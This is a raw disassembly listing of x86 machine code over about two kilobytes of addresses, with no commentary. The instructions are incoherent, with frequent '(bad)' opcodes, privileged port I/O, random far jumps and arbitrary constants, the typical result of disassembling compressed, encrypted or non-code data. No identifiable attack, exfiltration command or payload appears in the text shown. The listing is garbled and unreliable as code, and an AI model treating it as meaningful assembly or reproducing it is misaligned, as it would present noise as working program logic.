  41e6fb:	fwait
  41e6fc:	sbb    BYTE PTR [ebx-0x7d4b6f32],ah
  41e702:	(bad)  
  41e703:	sahf   
  41e704:	rcr    dl,1
  41e706:	cli    
  41e707:	push   ds
  41e708:	cdq    
  41e709:	cmp    al,0x64
  41e70b:	std    
  41e70c:	aaa    
  41e70d:	repz lahf 
  41e70f:	cmp    edi,esp
  41e711:	scas   eax,DWORD PTR es:[edi]
  41e712:	lods   al,BYTE PTR ds:[esi]
  41e713:	(bad)  
  41e714:	out    dx,al
  41e715:	xlat   BYTE PTR ds:[ebx]
  41e716:	in     eax,0x68
  41e718:	jmp    0x41e6fb
  41e71a:	aam    0xa3
  41e71c:	sbb    BYTE PTR [ebx-0x773a9cb7],ah
  41e722:	jmp    FWORD PTR [edi]
  41e724:	hlt    
  41e725:	xlat   BYTE PTR ds:[ebx]
  41e726:	pop    ebp
  41e727:	lods   al,BYTE PTR ds:[esi]
  41e728:	int3   
  41e729:	xor    eax,0x287f9907
  41e72e:	adc    ebp,DWORD PTR [edi]
  41e730:	loopne 0x41e6de
  41e732:	daa    
  41e733:	mov    esi,DWORD PTR [edi+0x47856b1b]
  41e739:	lds    ebp,FWORD PTR [esi-0x1c55cf27]
  41e73f:	shl    bl,0x3e
  41e742:	pop    ss
  41e743:	mov    bl,0xe8
  41e745:	(bad)  
  41e746:	scas   eax,DWORD PTR es:[edi]
  41e747:	bound  esp,QWORD PTR [eax+eax*8-0x7f]
  41e74b:	dec    ebx
  41e74c:	sub    DWORD PTR [edi],0xffffff85
  41e74f:	jecxz  0x41e71d
  41e751:	cs fcmovu st,st(2)
  41e754:	sub    BYTE PTR [esi-0x1db6918b],cl
  41e75a:	dec    esi
  41e75b:	jae    0x41e7a0
  41e75d:	sbb    bl,BYTE PTR [eax-0x65]
  41e760:	loopne 0x41e766
  41e762:	dec    ebx
  41e763:	jge    0x41e711
  41e765:	sbb    ecx,DWORD PTR [eax-0x41]
  41e768:	xchg   esi,eax
  41e769:	es inc ecx
  41e76b:	or     al,0xc2
  41e76d:	mov    bh,0xe8
  41e76f:	sbb    DWORD PTR [esi-0x2cf48a01],ebx
  41e775:	xor    al,0x60
  41e777:	test   DWORD PTR [ebx+0x3040a46c],ebx
  41e77d:	adc    BYTE PTR [eax-0x18],ah
  41e780:	nop
  41e781:	xor    eax,0x8a803e9e
  41e786:	pop    esp
  41e787:	cmc    
  41e788:	(bad)  
  41e789:	cld    
  41e78a:	mov    BYTE PTR [esi+0x47],cl
  41e78d:	jne    0x41e781
  41e78f:	cmp    ch,BYTE PTR [edx]
  41e791:	xor    eax,0xfea4dc36
  41e796:	dec    esi
  41e797:	pop    edi
  41e798:	xchg   edi,eax
  41e799:	push   edi
  41e79a:	sbb    eax,0xa8e17208
  41e79f:	add    al,0x5
  41e7a1:	add    ebx,0x845077f2
  41e7a7:	(bad)  
  41e7a8:	in     eax,0x9d
  41e7aa:	sti    
  41e7ab:	mov    ds:0x806406d6,eax
  41e7b0:	xchg   edi,eax
  41e7b1:	sbb    ch,BYTE PTR gs:[ebx+0x6c]
  41e7b5:	(bad)  
  41e7b6:	(bad)  
  41e7b8:	popf   
  41e7b9:	int3   
  41e7ba:	push   ss
  41e7bb:	sbb    ebp,esp
  41e7bd:	in     al,dx
  41e7be:	jmp    0xbfde8f75
  41e7c3:	push   esp
  41e7c4:	dec    ebp
  41e7c5:	jle    0x41e7aa
  41e7c7:	fdivrp st(5),st
  41e7c9:	jns    0x41e776
  41e7cb:	test   eax,0x5f72943f
  41e7d0:	mov    edi,0x20bcaccd
  41e7d5:	jne    0x41e83d
  41e7d7:	nop
  41e7d8:	adc    ah,0xa4
  41e7db:	mov    ds:0x5a1270d3,eax
  41e7e0:	xor    eax,0x5b8d7d6b
  41e7e5:	adc    DWORD PTR [esi+0x19],ebx
  41e7e8:	push   0x3dbfdad0
  41e7ed:	aaa    
  41e7ee:	int    0x90
  41e7f0:	(bad)  
  41e7f1:	adc    al,0x50
  41e7f3:	mov    edx,gs
  41e7f5:	rcl    DWORD PTR [ecx-0x6c70420f],0x2e
  41e7fc:	dec    ebp
  41e7fd:	xor    edi,DWORD PTR [edx]
  41e7ff:	mov    edx,0x97e7c4c7
  41e804:	sbb    edx,DWORD PTR [esi-0x4a]
  41e807:	(bad)  
  41e808:	push   ss
  41e809:	shl    BYTE PTR [ecx+eiz*1+0x23],1
  41e80d:	shr    DWORD PTR [esp+esi*1],0x0
  41e811:	dec    esi
  41e812:	std    
  41e813:	mov    edi,0x6e0e837b
  41e818:	cld    
  41e819:	sti    
  41e81a:	jmp    0x36a4:0x4819205f
  41e821:	mov    es,WORD PTR [edx+0x35848436]
  41e827:	and    eax,0x79928126
  41e82c:	(bad)  
  41e82d:	mov    ds:0xd970d80e,eax
  41e832:	xor    BYTE PTR [ecx-0x5b],ah
  41e835:	nop
  41e836:	sbb    al,BYTE PTR [edi+ebp*1-0x32]
  41e83a:	cmp    al,0x5e
  41e83c:	gs sub eax,0x8b85f1b9
  41e842:	imul   ecx,DWORD PTR [edi+edi*2+0x3e5bc530],0x39
  41e84a:	dec    edx
  41e84b:	jnp    0x41e83a
  41e84d:	push   es
  41e84e:	ds jge 0x41e823
  41e851:	dec    edx
  41e852:	add    esp,DWORD PTR [edi-0x79d5f72a]
  41e858:	test   BYTE PTR [ecx+0x1ded7bae],ah
  41e85e:	sbb    cl,BYTE PTR [esp+eax*1-0x6d804e8e]
  41e865:	ffreep st(3)
  41e867:	jno    0x41e8c0
  41e869:	rcr    DWORD PTR [ecx+eax*4+0x6a],cl
  41e86d:	out    0xb,eax
  41e86f:	and    BYTE PTR [esp+esi*4-0x7fbd505],dl
  41e876:	xchg   ebx,eax
  41e877:	or     al,0x5e
  41e879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e87a:	xor    edi,DWORD PTR [edx+0x3e]
  41e87d:	mov    al,ds:0x48beba6c
  41e882:	cdq    
  41e883:	mov    dh,0x9f
  41e885:	cmp    DWORD PTR [ecx-0xee5d93f],0x5ecf02aa
  41e88f:	pushf  
  41e890:	pop    esi
  41e891:	stos   DWORD PTR es:[edi],eax
  41e892:	scas   eax,DWORD PTR es:[edi]
  41e893:	and    al,BYTE PTR [edi]
  41e895:	jbe    0x41e876
  41e897:	jge    0x41e867
  41e899:	imul   ecx,DWORD PTR [ecx],0xb9f4be78
  41e89f:	cs addr16 sub al,0x82
  41e8a3:	outs   dx,DWORD PTR ds:[esi]
  41e8a4:	mov    ds:0x82886b5a,al
  41e8a9:	jo     0x41e8f5
  41e8ab:	ficom  DWORD PTR [ebx+ebx*4]
  41e8ae:	lock mov eax,ds:0x53e5f598
  41e8b4:	inc    esp
  41e8b5:	out    0x84,eax
  41e8b7:	add    al,0x90
  41e8b9:	inc    edi
  41e8ba:	(bad)  
  41e8bb:	aas    
  41e8bc:	lock test al,0xcf
  41e8bf:	dec    ebp
  41e8c0:	out    dx,eax
  41e8c1:	ds in  al,dx
  41e8c3:	cmp    bh,BYTE PTR [ebp+0x21]
  41e8c6:	sub    cl,0xf8
  41e8c9:	ds in  al,dx
  41e8cb:	out    dx,eax
  41e8cc:	fstp   QWORD PTR [esi*8+0x3e280775]
  41e8d3:	stos   DWORD PTR es:[edi],eax
  41e8d4:	sbb    eax,0x7ac7ad3e
  41e8d9:	pop    ss
  41e8da:	stos   DWORD PTR es:[edi],eax
  41e8db:	test   eax,0xfa8100c9
  41e8e0:	mov    edi,0x10464315
  41e8e5:	pop    ss
  41e8e6:	jbe    0x41e8cf
  41e8e8:	jecxz  0x41e920
  41e8ea:	xor    eax,0x411bc063
  41e8ef:	sub    edi,DWORD PTR [edx+0x4c]
  41e8f2:	retf   
  41e8f3:	push   cs
  41e8f4:	popf   
  41e8f5:	pop    edi
  41e8f6:	dec    edx
  41e8f7:	popf   
  41e8f8:	push   0xffffffe8
  41e8fa:	or     al,0xd1
  41e8fd:	mov    esp,0xbf521de7
  41e902:	inc    esi
  41e903:	aaa    
  41e904:	push   cs
  41e905:	mov    ch,0xd0
  41e907:	mov    eax,0xa5f95d2a
  41e90c:	cmp    al,0x52
  41e90e:	std    
  41e90f:	add    dl,al
  41e911:	fwait
  41e912:	test   eax,0xb69a8fcd
  41e917:	fadd   DWORD PTR [edx-0x7dd7eb51]
  41e91d:	pop    es
  41e91e:	mov    al,0x0
  41e920:	dec    ebp
  41e921:	aam    0xc8
  41e923:	pop    ecx
  41e924:	inc    edi
  41e925:	dec    ebp
  41e926:	loope  0x41e8d1
  41e928:	and    ecx,edi
  41e92a:	push   es
  41e92b:	imul   esi,DWORD PTR [eax],0xcfadee07
  41e931:	or     edx,DWORD PTR [esi+0x17]
  41e934:	pop    ss
  41e935:	out    0x72,al
  41e937:	(bad)  
  41e939:	inc    esi
  41e93a:	pop    ebp
  41e93b:	xor    BYTE PTR [ebx-0x550bc6a6],0x9a
  41e942:	cli    
  41e943:	add    eax,0x68afc8d8
  41e948:	inc    esi
  41e949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e94a:	mov    bh,0xc4
  41e94c:	sub    al,0x47
  41e94e:	inc    ebx
  41e94f:	mov    esp,0x380a46e5
  41e954:	in     eax,dx
  41e955:	mov    edi,0x90953b4a
  41e95a:	cli    
  41e95b:	out    dx,al
  41e95c:	and    DWORD PTR [edx-0x4a77ab8b],ebp
  41e962:	iret   
  41e963:	pop    ebp
  41e964:	test   eax,0x843a6678
  41e969:	test   eax,0x5cdaa452
  41e96e:	cmp    cl,dh
  41e970:	xor    ch,ah
  41e972:	mov    WORD PTR [edx-0x66c9b685],?
  41e978:	push   0xffffff80
  41e97a:	je     0x41e91b
  41e97c:	sbb    dh,0xb3
  41e97f:	jl     0x41e98e
  41e981:	push   0x4d
  41e983:	jno    0x41ea02
  41e985:	mov    ebx,0x1895e418
  41e98a:	pop    eax
  41e98b:	xor    DWORD PTR [eax+0x56d597bd],edi
  41e991:	rep outs dx,BYTE PTR ds:[esi]
  41e993:	adc    al,bl
  41e995:	mov    esi,0xadf0ff75
  41e99a:	jo     0x41e95e
  41e99c:	xor    al,0x36
  41e99e:	ret    
  41e99f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9a0:	pop    ss
  41e9a1:	dec    ebp
  41e9a2:	mov    edi,0x37cf2ae6
  41e9a7:	jbe    0x41ea00
  41e9a9:	add    dl,al
  41e9ab:	aad    0x7a
  41e9ad:	sub    dl,cl
  41e9af:	div    BYTE PTR [esi+0x2f820f0]
  41e9b5:	adc    al,0x42
  41e9b7:	mov    al,ds:0x7a31ce24
  41e9bc:	pop    ss
  41e9bd:	add    al,0x58
  41e9bf:	out    0x98,eax
  41e9c1:	push   edx
  41e9c2:	dec    ebp
  41e9c3:	mov    edi,ecx
  41e9c5:	jge    0x41ea0d
  41e9c7:	test   bh,al
  41e9c9:	popf   
  41e9ca:	mov    dh,0xbb
  41e9cc:	adc    bh,BYTE PTR [ecx-0x536fb64f]
  41e9d2:	and    eax,0x10b84558
  41e9d7:	sahf   
  41e9d8:	pop    ebx
  41e9d9:	std    
  41e9da:	dec    ecx
  41e9db:	push   edi
  41e9dc:	xor    ecx,edi
  41e9de:	call   0x7a16:0x7f3b810d
  41e9e5:	cmp    BYTE PTR [esi+0x3a598579],dl
  41e9eb:	lods   eax,DWORD PTR ds:[esi]
  41e9ec:	mov    dl,BYTE PTR [edi-0x6]
  41e9ef:	jge    0x41ea6b
  41e9f1:	adc    ecx,DWORD PTR [esi-0x62ee56e1]
  41e9f7:	rcl    eax,0xfc
  41e9fa:	xchg   al,al
  41e9fc:	mov    bh,0xed
  41e9fe:	push   ebp
  41e9ff:	add    ch,BYTE PTR [edx-0x6a]
  41ea02:	adc    al,0xbc
  41ea04:	in     al,0x5b
  41ea06:	fwait
  41ea07:	(bad)  
  41ea08:	sbb    DWORD PTR [ebx-0x5a],ebx
  41ea0b:	lahf   
  41ea0c:	pop    es
  41ea0d:	jae    0x41e9a9
  41ea0f:	addr16 aad 0x3f
  41ea12:	mov    edx,0xdebc6922
  41ea17:	xor    al,0x9e
  41ea19:	pop    ebp
  41ea1a:	cs mov ebp,ecx
  41ea1d:	push   esp
  41ea1e:	mov    al,ds:0x6c62346c
  41ea23:	jnp    0x41ea87
  41ea25:	js     0x41e9e7
  41ea27:	mov    edx,0x5f40438b
  41ea2c:	cmp    edi,DWORD PTR [ebp-0xfad1a84]
  41ea32:	mov    eax,0xc8ed66a
  41ea37:	xor    DWORD PTR [ebx-0x29fe979a],eax
  41ea3d:	in     al,0x84
  41ea3f:	popf   
  41ea40:	sar    BYTE PTR [eax],0xec
  41ea43:	mov    esp,0x477fbfbb
  41ea48:	cmp    al,0xc7
  41ea4a:	mov    dh,0x31
  41ea4c:	imul   ebx,DWORD PTR ds:0x980dc745,0x25
  41ea53:	mov    bh,0xbb
  41ea55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea56:	stc    
  41ea57:	adc    al,dh
  41ea59:	jno    0x41eace
  41ea5b:	sub    BYTE PTR [edi-0x5f],ah
  41ea5e:	push   edx
  41ea5f:	pop    ss
  41ea60:	(bad)  
  41ea61:	ficomp DWORD PTR [ebx+0x29]
  41ea64:	nop
  41ea65:	inc    ebx
  41ea66:	sahf   
  41ea67:	iret   
  41ea68:	int    0xb8
  41ea6a:	dec    eax
  41ea6b:	and    dh,cl
  41ea6d:	test   BYTE PTR [ecx],ch
  41ea6f:	pusha  
  41ea70:	pop    edx
  41ea71:	push   esp
  41ea72:	sbb    eax,0x59759149
  41ea77:	adc    BYTE PTR [edi-0x2ec0f713],bl
  41ea7d:	jg     0x41ea5b
  41ea7f:	not    BYTE PTR [esi]
  41ea81:	dec    edx
  41ea82:	nop
  41ea83:	(bad)  
  41ea84:	cs addr16 fucomp st(3)
  41ea88:	loopne 0x41ea7c
  41ea8a:	pop    ecx
  41ea8b:	push   es
  41ea8c:	sahf   
  41ea8d:	mov    WORD PTR [edx],fs
  41ea8f:	sbb    al,0xee
  41ea91:	adc    al,cl
  41ea93:	inc    esi
  41ea94:	adc    al,0x94
  41ea96:	pop    ss
  41ea97:	sti    
  41ea98:	push   0xffffffa7
  41ea9a:	mov    edi,0x72d57c06
  41ea9f:	cld    
  41eaa0:	xor    bl,BYTE PTR [edx-0x39622ec]
  41eaa6:	adc    al,0x57
  41eaa8:	sti    
  41eaa9:	fs aad 0xb3
  41eaac:	(bad)  
  41eaad:	xlat   BYTE PTR ds:[ebx]
  41eaae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eaaf:	shr    DWORD PTR [edx-0xc],0x55
  41eab3:	mov    ah,0xd8
  41eab5:	fld    TBYTE PTR [ebp+0x2e]
  41eab8:	xchg   ebp,eax
  41eab9:	sbb    esp,0xa705688a
  41eabf:	les    edi,FWORD PTR [edx+edx*8+0x7cbbe30c]
  41eac6:	pop    esp
  41eac7:	rcl    ecx,1
  41eac9:	ror    DWORD PTR [eax+eax*8+0x12505e6c],1
  41ead0:	outs   dx,DWORD PTR ds:[esi]
  41ead1:	push   0xe70767df
  41ead6:	mov    ch,BYTE PTR [edx]
  41ead8:	popf   
  41ead9:	gs cdq 
  41eadb:	les    ebp,FWORD PTR [eax+0x15b4c5e6]
  41eae1:	imul   edi,DWORD PTR [eax+0x63ade504],0x82e18f6c
  41eaeb:	(bad)  
  41eaec:	in     eax,dx
  41eaed:	jg     0x41ea7f
  41eaef:	mov    ah,0x11
  41eaf1:	sbb    eax,0x19adff1
  41eaf6:	outs   dx,BYTE PTR ds:[esi]
  41eaf7:	lahf   
  41eaf8:	mov    BYTE PTR [ebx-0x5d17d0af],cl
  41eafe:	sti    
  41eaff:	xlat   BYTE PTR ds:[ebx]
  41eb00:	adc    edi,eax
  41eb02:	les    esi,FWORD PTR [ebx-0x606bc802]
  41eb08:	(bad)  
  41eb09:	sub    DWORD PTR [edi+0x68],esi
  41eb0c:	aas    
  41eb0d:	cmp    eax,0x91effe75
  41eb12:	ds in  eax,dx
  41eb14:	into   
  41eb15:	cmc    
  41eb16:	jne    0x41eb8a
  41eb18:	ins    DWORD PTR es:[edi],dx
  41eb19:	mov    DWORD PTR [esi-0x45],edx
  41eb1c:	or     al,0x4a
  41eb1e:	aad    0xc1
  41eb20:	adc    DWORD PTR [ecx+0x28784ccd],ebx
  41eb26:	or     BYTE PTR [edi],bh
  41eb28:	ja     0x41eb45
  41eb2a:	push   es
  41eb2b:	add    ecx,DWORD PTR [ecx+0x12d209b7]
  41eb31:	or     DWORD PTR [edx-0x6c1e1e5c],ecx
  41eb37:	push   edx
  41eb38:	mov    bh,BYTE PTR ds:0xf5123ceb
  41eb3e:	int3   
  41eb3f:	mov    BYTE PTR ss:[ecx-0x65],cl
  41eb43:	mov    cl,BYTE PTR ss:[eax+0x66]
  41eb47:	xor    DWORD PTR [edx-0x56],esi
  41eb4a:	sbb    eax,0x6c339709
  41eb4f:	ss aad 0x2b
  41eb52:	push   ebp
  41eb53:	icebp  
  41eb54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb56:	js     0x41eb88
  41eb58:	xor    bh,bh
  41eb5a:	add    dh,BYTE PTR [ebp-0x22824662]
  41eb60:	into   
  41eb61:	inc    ebp
  41eb62:	xchg   edx,eax
  41eb63:	ret    0x583
  41eb66:	add    DWORD PTR [eax+0x5cca4078],edx
  41eb6c:	cmp    ch,BYTE PTR [esi-0x15]
  41eb6f:	test   DWORD PTR [ebx-0x19561ac],edi
  41eb75:	mov    edx,0x89fe847b
  41eb7a:	add    BYTE PTR [eax],bl
  41eb7c:	fsubr  QWORD PTR [eax+0x26d5ae65]
  41eb82:	add    dh,0x46
  41eb85:	mul    BYTE PTR [ebp-0x71]
  41eb88:	xor    eax,0x2b6be9bc
  41eb8d:	jne    0x41ebf3
  41eb8f:	shl    bh,cl
  41eb91:	rcl    DWORD PTR [ebx+ebx*1],1
  41eb94:	sbb    DWORD PTR [ecx],eax
  41eb96:	fisubr WORD PTR [eax+0x3aba52f1]
  41eb9c:	fst    DWORD PTR [eax+edx*4+0x1d1a1355]
  41eba3:	imul   ebp,esp,0x7e078b98
  41eba9:	cmp    BYTE PTR ds:0x8260adda,ah
  41ebaf:	not    DWORD PTR [ecx+0x7ee252d8]
  41ebb5:	daa    
  41ebb6:	lock inc edi
  41ebb8:	ss xchg esi,eax
  41ebba:	imul   BYTE PTR [eax-0x51]
  41ebbd:	adc    bh,BYTE PTR [ebx+0x14]
  41ebc0:	fcomi  st,st(5)
  41ebc2:	mov    ebp,0x9ab2cce6
  41ebc7:	xchg   ecx,eax
  41ebc8:	popa   
  41ebc9:	imul   esp,ecx,0x61
  41ebcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebcd:	sbb    edi,esp
  41ebcf:	sbb    DWORD PTR ds:0x786941d2,edi
  41ebd5:	inc    ecx
  41ebd6:	pop    esp
  41ebd7:	mov    esi,0xe143d924
  41ebdc:	int3   
  41ebdd:	pop    esi
  41ebde:	imul   edi,ebx,0xffffff83
  41ebe1:	jmp    0x41ec16
  41ebe3:	into   
  41ebe4:	test   BYTE PTR [esi],0xb
  41ebe7:	inc    edx
  41ebe8:	xchg   edx,eax
  41ebe9:	adc    esp,edi
  41ebeb:	lods   al,BYTE PTR ds:[esi]
  41ebec:	call   0xd05237e
  41ebf1:	call   0x7d54:0x848e496
  41ebf8:	repnz rcl bl,cl
  41ebfb:	iret   
  41ebfc:	push   es
  41ebfd:	sti    
  41ebfe:	stos   BYTE PTR es:[edi],al
  41ebff:	(bad)  
  41ec00:	mov    ds:0x32c35146,al
  41ec05:	cmp    BYTE PTR [ebx+0x26c70d2],cl
  41ec0b:	jbe    0x41ec1b
  41ec0d:	das    
  41ec0e:	arpl   WORD PTR [edi+ebp*8],di
  41ec11:	aam    0x5c
  41ec13:	bound  eax,QWORD PTR [ecx+0x22]
  41ec16:	repz and edx,0xffffffec
  41ec1a:	push   edx
  41ec1b:	mov    esp,0x1c17b9e5
  41ec20:	mov    dl,0xf3
  41ec22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec23:	loopne 0x41ebd1
  41ec25:	jle    0x41ebb4
  41ec27:	pop    edx
  41ec28:	adc    ecx,DWORD PTR [ecx+ecx*2+0x11]
  41ec2c:	aam    0xbf
  41ec2e:	pop    ss
  41ec2f:	mov    edx,0x9895ac45
  41ec34:	call   0xf940ca3f
  41ec39:	mov    ebp,0xd9f5aa47
  41ec3e:	sub    eax,0xfaead652
  41ec43:	inc    ecx
  41ec44:	mov    BYTE PTR [eax-0x66],al
  41ec47:	push   edi
  41ec48:	mov    cl,0x56
  41ec4a:	xchg   esi,eax
  41ec4b:	call   0xf17073ae
  41ec50:	sbb    ecx,eax
  41ec52:	jle    0x41ec27
  41ec54:	mov    ebx,0xee629a5c
  41ec59:	sub    esp,DWORD PTR [ebx-0x6dae4595]
  41ec5f:	stos   DWORD PTR es:[edi],eax
  41ec60:	xor    dh,BYTE PTR [ecx-0x249f6a0b]
  41ec66:	and    ecx,DWORD PTR [ebx-0x1aa5970a]
  41ec6c:	rcl    eax,cl
  41ec6e:	or     BYTE PTR [esi+0x73e37aa3],ah
  41ec74:	or     esi,DWORD PTR [edi-0x38efb6fc]
  41ec7a:	dec    edi
  41ec7b:	push   es
  41ec7c:	stc    
  41ec7d:	mov    bh,0x29
  41ec7f:	(bad)  
  41ec80:	sub    al,0x51
  41ec82:	dec    edx
  41ec83:	stos   DWORD PTR es:[edi],eax
  41ec84:	xchg   ebp,eax
  41ec85:	inc    ebx
  41ec86:	loope  0x41ece9
  41ec88:	dec    esp
  41ec89:	(bad)  
  41ec8b:	test   esp,ebp
  41ec8d:	out    0x53,al
  41ec8f:	xchg   DWORD PTR [ebx+0x5dce419f],esp
  41ec95:	pop    es
  41ec96:	cmp    ch,BYTE PTR [ebx-0x39cd544d]
  41ec9c:	sti    
  41ec9d:	(bad)  
  41ec9f:	pcmpgtw mm3,QWORD PTR [edx-0x60a069df]
  41eca6:	cmp    edi,0xf9ea6cf8
  41ecac:	in     al,dx
  41ecad:	push   edx
  41ecae:	xchg   edx,eax
  41ecaf:	xchg   esp,eax
  41ecb0:	stos   BYTE PTR es:[edi],al
  41ecb1:	clc    
  41ecb2:	rcr    BYTE PTR [esi-0x65],cl
  41ecb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecb6:	mov    edx,0xdbfe198d
  41ecbb:	inc    ebx
  41ecbc:	repnz sbb DWORD PTR [edx],edx
  41ecbf:	(bad)  
  41ecc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecc1:	mov    esp,0x54c544f8
  41ecc6:	pushf  
  41ecc7:	push   DWORD PTR [edi-0x57590939]
  41eccd:	(bad)  
  41eccf:	retf   0xb56
  41ecd2:	iret   
  41ecd3:	icebp  
  41ecd4:	das    
  41ecd5:	ret    
  41ecd6:	cmp    ebp,DWORD PTR [esi-0x7a]
  41ecd9:	nop
  41ecda:	jb     0x41ec7c
  41ecdc:	ins    DWORD PTR es:[edi],dx
  41ecdd:	adc    eax,0x11d85292
  41ece2:	dec    esi
  41ece3:	dec    esp
  41ece4:	pop    es
  41ece5:	imul   ebp,DWORD PTR [ecx+0x6f],0x99fe5ab1
  41ecec:	stc    
  41eced:	sbb    DWORD PTR [ecx],ebx
  41ecef:	mov    bh,BYTE PTR [eax-0x36]
  41ecf2:	push   cs
  41ecf3:	cmp    al,0xd2
  41ecf5:	stc    
  41ecf6:	mov    al,ds:0xd831398c
  41ecfb:	imul   eax,DWORD PTR [ebp+0x10d39913],0xffffffc6
  41ed02:	stos   BYTE PTR es:[edi],al
  41ed03:	stos   DWORD PTR es:[edi],eax
  41ed04:	ja     0x41ec88
  41ed06:	popf   
  41ed07:	adc    al,0xf9
  41ed09:	mov    eax,0x601e2413
  41ed0e:	jbe    0x41ed31
  41ed10:	sar    BYTE PTR [ecx+0x7a2a2c97],0x42
  41ed17:	dec    edi
  41ed18:	ins    DWORD PTR es:[edi],dx
  41ed19:	dec    eax
  41ed1a:	and    ebp,DWORD PTR [eax]
  41ed1c:	inc    edx
  41ed1d:	or     BYTE PTR [ebp+0x147aab2],cl
  41ed23:	stos   DWORD PTR es:[edi],eax
  41ed24:	call   0x237af2b4
  41ed29:	jnp    0x41ecc0
  41ed2b:	inc    eax
  41ed2c:	sbb    cl,BYTE PTR ds:0xc823a679
  41ed32:	cdq    
  41ed33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed34:	cmp    DWORD PTR [edi],0x49ab650c
  41ed3a:	sub    eax,0x97ecc125
  41ed3f:	mov    al,ds:0x9d843e2d
  41ed44:	pop    DWORD PTR [ebp-0x32]
  41ed47:	ror    BYTE PTR ss:[esi-0x6aa17a6e],1
  41ed4e:	dec    edi
  41ed4f:	cmp    dh,cl
  41ed51:	xor    al,0x2a
  41ed53:	cmp    BYTE PTR [ebp+edx*2+0x58],cl
  41ed57:	inc    edx
  41ed58:	aaa    
  41ed59:	push   0xa78d7697
  41ed5e:	into   
  41ed5f:	inc    edx
  41ed60:	retf   0xe07f
  41ed63:	in     eax,0x8f
  41ed65:	stc    
  41ed66:	adc    esi,DWORD PTR [si]
  41ed69:	mov    gs,WORD PTR [ebp+edi*1-0x47ef202e]
  41ed70:	and    cl,0x8d
  41ed73:	icebp  
  41ed74:	shl    eax,1
  41ed76:	push   esi
  41ed77:	xchg   esi,eax
  41ed78:	mov    ebx,0x2e1adbb2
  41ed7d:	sbb    DWORD PTR [edi+0x1fe1ff2],0x23324a09
  41ed87:	aaa    
  41ed88:	leave  
  41ed89:	adc    eax,0x7ad5a2b0
  41ed8e:	int3   
  41ed8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed91:	sub    DWORD PTR [edi+0x79],ebp
  41ed94:	sub    al,0x71
  41ed96:	or     esi,ebx
  41ed98:	jg     0x41edba
  41ed9a:	jmp    DWORD PTR ds:0x3bf352ea
  41eda0:	arpl   di,bx
  41eda2:	lods   al,BYTE PTR cs:[esi]
  41eda4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eda5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eda6:	rcl    BYTE PTR [ebx-0x2c],0x89
  41edaa:	cs or  al,0xb
  41edad:	jnp    0x41ed9b
  41edaf:	sbb    al,0x90
  41edb1:	shl    BYTE PTR ds:0x159e061e,0x2b
  41edb8:	icebp  
  41edb9:	jg     0x41ed71
  41edbb:	mov    dl,0x6e
  41edbd:	jp     0x41ed58
  41edbf:	js     0x41edf4
  41edc1:	adc    dl,BYTE PTR [ebx+0x4ccce8db]
  41edc7:	scas   eax,DWORD PTR es:[edi]
  41edc8:	ds adc eax,0x102721a6
  41edce:	add    ch,cl
  41edd0:	mov    cs,WORD PTR [eax+edx*2+0x1a]
  41edd4:	dec    ecx
  41edd5:	jb     0x41ed77
  41edd7:	jo     0x41ed85
  41edd9:	dec    ecx
  41edda:	xchg   esi,eax
  41eddb:	push   0xf72b08cc
  41ede0:	mov    dl,0xe7
  41ede2:	ret    0x1f6c
  41ede5:	xsaveopt [eax+0xe]
  41ede9:	adc    DWORD PTR [ebx+0x26],esp
  41edec:	mov    ebx,0xddef9f99
  41edf1:	fmul   st(7),st
  41edf3:	in     al,0x48
  41edf5:	(bad)  
  41edf6:	repnz cmp eax,esi
  41edf9:	pop    edi
  41edfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edfb:	ds je  0x41ee77
  41edfe:	sub    al,dh
  41ee00:	repnz pop esp
  41ee02:	ret    0x7fa9
  41ee05:	aaa    
  41ee06:	inc    esi
  41ee07:	push   ebx
  41ee08:	in     eax,dx
  41ee09:	push   ebp
  41ee0a:	in     al,0x56
  41ee0c:	xchg   ebp,eax
  41ee0d:	pusha  
  41ee0e:	adc    ecx,DWORD PTR [esi]
  41ee10:	loope  0x41ee25
  41ee12:	sbb    eax,0x5f39ffa7
  41ee17:	cmp    DWORD PTR [ecx],0x88d142e6
  41ee1d:	mov    ds,WORD PTR [ebx-0x7b]
  41ee20:	dec    ebp
  41ee21:	scas   al,BYTE PTR es:[edi]
  41ee22:	sbb    eax,0xfaa03185
  41ee27:	sbb    dh,BYTE PTR [edi+0x4c74773d]
  41ee2d:	xchg   edx,eax
  41ee2e:	adc    ebp,DWORD PTR [edx-0x1f]
  41ee31:	inc    ecx
  41ee32:	mov    dl,0xda
  41ee34:	stc    
  41ee35:	inc    ebx
  41ee36:	pop    ds
  41ee37:	addr16 out 0xe2,al
  41ee3a:	in     al,dx
  41ee3b:	int3   
  41ee3c:	pop    es
  41ee3d:	sbb    eax,0xd431f910
  41ee42:	lods   al,BYTE PTR ds:[esi]
  41ee43:	sar    DWORD PTR [esi+0x67],0xd9
  41ee47:	push   0x38
  41ee49:	std    
  41ee4a:	loope  0x41ee77
  41ee4c:	test   DWORD PTR [ebx+0x49],esp
  41ee4f:	dec    edi
  41ee50:	inc    edi
  41ee51:	js     0x41ee34
  41ee53:	jge    0x41ee71
  41ee55:	mov    DWORD PTR [esi-0x57],0xc0f7177b
  41ee5c:	mov    ebx,0x5c42acbd
  41ee61:	jbe    0x41ede3
  41ee63:	mov    DWORD PTR [ecx-0x33eef5cf],edi
  41ee69:	shl    cl,0x39
  41ee6c:	add    eax,0x8c44ff50
  41ee71:	lahf   
  41ee72:	xchg   ecx,eax
  41ee73:	mov    eax,ds:0xdd4c62e1
  41ee78:	adc    al,0x9
  41ee7a:	adc    DWORD PTR [edi],ebp
